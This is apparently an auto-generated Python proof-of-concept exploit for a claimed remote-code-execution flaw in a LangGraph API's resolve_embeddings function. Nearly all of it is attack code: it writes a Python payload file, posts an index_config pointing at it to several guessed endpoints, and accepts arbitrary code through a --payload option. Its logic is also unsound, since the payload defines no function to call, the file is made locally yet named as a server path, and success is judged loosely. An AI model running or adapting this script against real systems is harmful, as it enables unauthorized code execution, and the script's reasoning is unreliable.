#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-025
# Sink: resolve_embeddings
# Auto-generated — run with: python3 rce_when_embed_key_contains_resolve_embeddings.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src.

Vulnerability: The `resolve_embeddings` function in graph.py accepts a user-controlled
`index_config` dictionary. When the `embed` key contains a string with '.py:',
it extracts a file path and function name, then dynamically imports and executes
code from that file. No validation or sanitization is performed on the file path,
allowing arbitrary file inclusion and code execution.

Impact: An attacker can provide a path to an arbitrary Python file (e.g.,
'/tmp/malicious.py:func') to achieve remote code execution on the server.

Usage:
    python3 poc.py [target_url]

    Default target: http://localhost:8000
"""

import sys
import os
import tempfile
import requests
import argparse
import time

# Default target URL
DEFAULT_TARGET = "http://localhost:8000"

# Benign payload: creates a marker file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

# Malicious payload example (commented out for safety):
# MALICIOUS_PAYLOAD = """
# import os
# os.system('id > /tmp/pwned.txt')
# """


def create_malicious_py_file(payload: str) -> str:
    """
    Create a temporary Python file with the given payload.
    Returns the path to the created file.
    """
    # Create a temporary file with .py extension
    fd, path = tempfile.mkstemp(suffix='.py', prefix='exploit_')
    with os.fdopen(fd, 'w') as f:
        f.write(payload)
    print(f"[+] Created malicious Python file: {path}")
    return path


def send_exploit(target_url: str, file_path: str, function_name: str = "exploit"):
    """
    Send the exploit request to the target.
    
    The exploit works by providing an index_config with an 'embed' key
    that contains a path to our malicious file and a function name.
    The function resolve_embeddings will:
    1. Split on '.py:' to get file path and function name
    2. Load the file using importlib.util.spec_from_file_location
    3. Execute the module
    4. Call the specified function
    
    Args:
        target_url: Base URL of the target service
        file_path: Path to the malicious Python file
        function_name: Name of the function to call in the malicious file
    """
    # Construct the embed string in the format expected by the vulnerable code
    embed_string = f"{file_path}:{function_name}"
    
    # The index_config dictionary that will be passed to resolve_embeddings
    # This is the attacker-controlled input
    index_config = {
        "embed": embed_string
    }
    
    # The vulnerable function is called from various API endpoints.
    # We'll try to find an endpoint that accepts index_config.
    # Common endpoints that might use this functionality:
    endpoints = [
        f"{target_url}/api/embeddings",
        f"{target_url}/api/index",
        f"{target_url}/api/vectorstore",
        f"{target_url}/api/search",
    ]
    
    print(f"[*] Attempting exploit against {target_url}")
    print(f"[*] Embed string: {embed_string}")
    print(f"[*] Function name: {function_name}")
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            response = requests.post(
                endpoint,
                json=index_config,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
            # If we get a response, the exploit might have worked
            if response.status_code < 500:
                print(f"[+] Got response from {endpoint}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {endpoint}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False


def verify_exploit():
    """
    Verify if the exploit was successful by checking for the marker file.
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file found: {marker_file}")
        print("[+] Remote code execution confirmed!")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src resolve_embeddings"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--function",
        default="exploit",
        help="Function name to call in the malicious file (default: exploit)"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="Python code to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] LangGraph API RCE PoC")
    print("[*] =====================")
    print(f"[*] Target: {args.target}")
    print(f"[*] Function: {args.function}")
    
    # Step 1: Create the malicious Python file
    print("\n[*] Step 1: Creating malicious Python file...")
    malicious_file = create_malicious_py_file(args.payload)
    
    try:
        # Step 2: Send the exploit
        print("\n[*] Step 2: Sending exploit...")
        exploit_sent = send_exploit(args.target, malicious_file, args.function)
        
        if exploit_sent:
            # Step 3: Wait a moment for the code to execute
            print("\n[*] Step 3: Waiting for execution...")
            time.sleep(2)
            
            # Step 4: Verify the exploit
            print("\n[*] Step 4: Verifying exploit...")
            verify_exploit()
        else:
            print("\n[-] Exploit may not have been sent successfully.")
            print("[*] The target might not be running or the endpoint might differ.")
            print("[*] Try different endpoints or check if the service is accessible.")
    
    finally:
        # Clean up the temporary file
        try:
            os.remove(malicious_file)
            print(f"[*] Cleaned up temporary file: {malicious_file}")
        except OSError:
            pass


if __name__ == "__main__":
    main()
